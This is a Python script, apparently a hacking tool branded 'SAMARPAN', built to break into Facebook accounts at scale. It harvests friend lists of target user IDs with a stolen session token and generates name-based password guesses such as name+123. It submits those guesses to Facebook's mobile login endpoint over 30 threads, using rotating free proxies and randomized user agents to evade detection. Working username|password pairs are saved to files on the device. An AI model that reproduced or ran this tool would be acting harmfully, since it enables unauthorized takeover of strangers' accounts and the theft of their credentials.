import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
#--------------------[ BAGIAN-MASUK ]--------------#
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#-------------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:




   prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
   prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
   prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
   prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
   prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/https.txt').text
   prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks4.txt').text
   prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt')
   prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
   prox= requests.get('https://raw.githubusercontent.com/casals-ar/proxy.casals.ar/main/socks5').text
   prox= requests.get('https://raw.githubusercontent.com/tigermain/X-TIGER-X/main/ID.txt').text
   prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
   prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/https.txt').text
   prox= requests.get('https://github.com/Chigozieworldwide/XFORD/blob/main/https.txt').text
   prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks4.txt').text
   prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all').text
   prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
   prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text
   prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
   prox= requests.get('https://raw.githubusercontent.com/Rananadeem5214/rnd00/main/.prox.txt').text
   prox= requests.get('https://raw.githubusercontent.com/Rananadeem5214/File11/main/.prox.txt').text
   prox= requests.get('https://raw.githubusercontent.com/tigermain/X-TIGER-X/main/ID.txt').text
   prox= requests.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt').text
   prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
   prox= requests.get('https://raw.githubusercontent.com/James404-cyber/binnos/main/socks5.txt').text
   prox= requests.get('https://raw.githubusercontent.com/James404-cyber/binnos/main/socks4.txt').text
   prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
   prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
   prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text	
   prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
   open('.prox.txt','w').write(prox) 
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
for t in range(10000):
	a=random.choice([
									"4",
									"5",
									"6",
									"7",
									"8",
									"9",
									"10",
									"11",
									"12",
									"13",
									"9.1.5",
									"5.1.6",
									"4.0.1",
									"3.0.1",
									"4.0.2",
									"5.0.2",
									"6.0.1",
									"6.2.2",
									"7.0.1",
									"7.1.0",
									"8.1.0",
									"4.4.4",
									"5.6.1",
									"6.1.3"
									])
	b=random.choice([
									'en-us',
									'en-gb',
									'id-id',
									'de-de',
									'ru-ru',
									'en-sg',
									'fr-fr',
									'fa-ir',
									'ja-jp',
									'pt-br',
									'cs-cz',
									'zh-hk',
									'zh-cn',
									'vi-vn',
									'en-ph',
									'en-in',
									'tr-tr'
									])
	c=random.choice([
									"Redmi 7",
									"Redmi Note 8",
									"Redmi 6A",
									"Mi 9 Lite",
									"Redmi Note 11 Pro",
									"Redmi 5A",
									"Mi 9 SE",
									"POCO M4 Pro",
									"POCO X3 Pro",
									"Redmi 5 Plus",
									"Redmi Note 10 Pro",
									"M2007J22G",
									"Redmi 9C NFC"
									])
	d=random.choice([
									'OPM1',
									'TP1A',
									'RP1A',
									'PPR1',
									'PKQ1',
									'QP1A',
									'SP1A',
									'RKQ1'
									])
	e=random.choice([
									'001',
									'002',
									'003',
									'004',
									'005',
									'006',
									'007',
									'008',
									'009',
									'010',
									'011',
									'012',
									'013',
									'014',
									'015',
									'016',
									'017',
									'018',
									'019',
									'020'
									])
	f=random.randrange(111111,199999)
	g=random.randrange(10,300)
	h=random.randrange(1111,9999)
	i=random.randrange(20,100)
	j=random.choice([
									"XiaoMi/MiuiBrowser/13.23.2-gn",
									"XiaoMi/MiuiBrowser/13.13.2-gn",
									"XiaoMi/MiuiBrowser/13.16.1-gn",
									"XiaoMi/MiuiBrowser/13.25.2.1-gn",
									"XiaoMi/MiuiBrowser/12.15.3-go",
									"XiaoMi/MiuiBrowser/13.29.0-gn",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.7.5-go",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.22.0.3-gn"
									])
	kondom1=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c} Build/{d}.{f}.{e}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	kondom2=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	uaku = random.choice([kondom1,kondom2])
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ SAMARPAN ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
#--------------------[ CONVERTER-BULAN ]--------------#
okc = 'STXR222-OK.txt' 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#-------------------------------------------------------------------------------------------------------#
def banner():
    clear()
    print(f"""\033[1;32m
\033[31;1m⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
\033[32;1m⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
\033[33;1m⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
\033[34;1m⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
\033[35;1m⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
\033[36;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
\033[37;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
\033[31;1m⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
\033[32;1m⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
\033[33;1m⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
\033[34;1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

\x1b[38;5;82m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;82m┃    _   ______  ____  _____________    ┃NAME=SAMARPAN JABEU       ┃
\x1b[38;5;82m┃   / | / / __ \/ __ )/  _/_  __/   |   ┃FACEBOOK=SAMARPANJABEGU   ┃
\x1b[38;5;82m┃  /  |/ / / / / __  |/ /  / / / /| |   ┃VERSION=1.0               ┃
\x1b[38;5;82m┃ / /|  / /_/ / /_/ // /  / / / ___ |   ┃WHATSAPP=+9779816029717   ┃
\x1b[38;5;82m┃/_/ |_/\____/_____/___/ /_/ /_/  |_|   ┃GITHUB=MR×SPJL            ┃
\x1b[38;5;82m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")          
os.system('clear')
os.system('espeak -a 300 " Welcome,   to,  LALO,  SAD,  Tools"')
os.system('clear')
#--------------------[ BAGIAN-MASUK ]--------------#   
def login3():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# KESHA XATA YAN  DUBARAY KAWA TOOLAKA RUN BKAWA'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login3()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'  [{h}•{x}] cookies:{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sTAWAWA COOKIES%s'%(h, p))

				else:
					print('%TOKEN WARNGERA COOKIE TAZA BENA%s'%(m, p))

			except:
				print('TOKEN WARNGERA COOKIE TAZA BENA')

		print(f'  {x}[{h}•{x}]{h} MALDIV YAN BEXAL?  ');
		print(f'  {x}[{h}•{x}]{h} MLADIV OUF');
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s TAWAWA DAXL BUUU !!%s'%(x,k,x,m,x));
		print(e)
		exit()
        

#------------------[ MENU ]----------------#
 #===©===#
sys.stdout.write('\x1b]2; HI WELCOME TO VIP SAMARPAN TOOLS  \x07')
os.system('clear')
banner()

def SAMARPAN():
	naw = input("\n\x1b[1;96m ENTER YOUR NAME : ")
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] SAMARPAN SAID SOMETHING WRONG ILL PASSED')
		login_lagi334()
	os.system('clear')
	banner()
	print('%s[%s1%s]%s PUBLIC CRACK %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s2%s]%s CRACK FILE %s[%sON%s]'%(P,H,P,H,P,H,P))		
	print('%s[%s0%s]%s CHANGE COOKIE %s[%sOut%s]'%(P,H,P,H,P,H,P))
	_____SAMARPAN__FBI_____    = input('\033[1;36mOPTION :  ')
	if _____SAMARPAN__FBI_____ in ['2']:
		crack_file()
	elif _____SAMARPAN__FBI_____ in ['1']:
		dump_massal()
	elif _____SAMARPAN__FBI_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> TO COOKIEST GORE!!! ')
		exit()
	else:
		print('╰─> Pilih Yang Bener Asu ')
	back()
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    o = input('\033[1;35m FILE NAME:\033[1;35m ')
    try:lin = open(o).read().splitlines()
    except:
        animation('[×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
#-------------[ CRACK-FROM-public ]------------------#
def dump_massal():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		exit()
	try:
		linex()
		jum = int(input(' [\u001b[36m•\033[1;37m] ENTER TARGET AMOUNT  : '))
		linex()
	except ValueError:
		linex()
		animation(' [×] INVALID OPTION ')
		exit()
	if jum<1 or jum>100000000:
		linex()
		animation(' [×] TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [\u001b[36m•\033[1;37m] INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' [×] TRY AGAIN ')
			os.system('clear')
	try:
		linex()
		print(f' [\u001b[36m•\033[1;37m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		linex()
		animation(" [×] DUMP ID FAILED ")
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print("\033[1;36m [1] BEST METHOD")
    hu = input('\033[97;1m\033[92;1m\033[91;1mCHOSE :\033[92;1m ')
    if hu in ['1','01']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    elif hu in ['30','030']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print("\033[1;32m [1]METHOD BEST")
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
    print("")
    print('\033[1;37m-----------------------------------------------')
    print('HAMO IDYAKAN :'       +str(len(id)))
    print('\033[1;37m-----------------------------------------------')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'1212')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'112233')
                    pwv.append(frs+frs)
                    pwv.append(frs+'123@')
                    pwv.append(frs+'2000')
                    pwv.append('123'+frs)
                    pwv.append('1234'+frs)
                    pwv.append('12345'+frs)
                    pwv.append(frs+'1234567')
                    pwv.append(frs+'12345678')   
                    pwv.append(frs+'123456789')   
                    pwv.append(frs+'1234567890') 
                    pwv.append(frs+'123'+frs)   
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'1212')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'112233')
                    pwv.append(frs+frs)
                    pwv.append(frs+'123@')
                    pwv.append(frs+'2000')
                    pwv.append('123'+frs)
                    pwv.append('1234'+frs)
                    pwv.append('12345'+frs)
                    pwv.append(frs+'1234567')
                    pwv.append(frs+'12345678')   
                    pwv.append(frs+'123456789')   
                    pwv.append(frs+'1234567890') 
                    pwv.append(frs+'123'+frs)   
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
   
#SAMARPAN💚🥀
#--------------------[ METODE-B-API ]-----------------#
 #SAMARPAN
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{bo}[SAMARPAN-143] {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}] {bo}{'{}'.format(loop/float(len(id)))}{P}  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ua=random.choice(ugen)
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            ua=random.choice(ugen)
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r \x1b[\x1b[1;91mSAMARPAN-143-CP] {idf} | {pw}')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\r\x1b[38;5;46m[SAMARPAN-143-OK💚] '+idf+ ' | '+pw+'')
                open('/sdcard/SAMARPAN_143-OK.txt','a').write(idf+' | '+pw+'\n')
                
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
def cek_SAMARPAN(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))		
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .SAMARPANx.txt')
    except:pass
SAMARPAN()

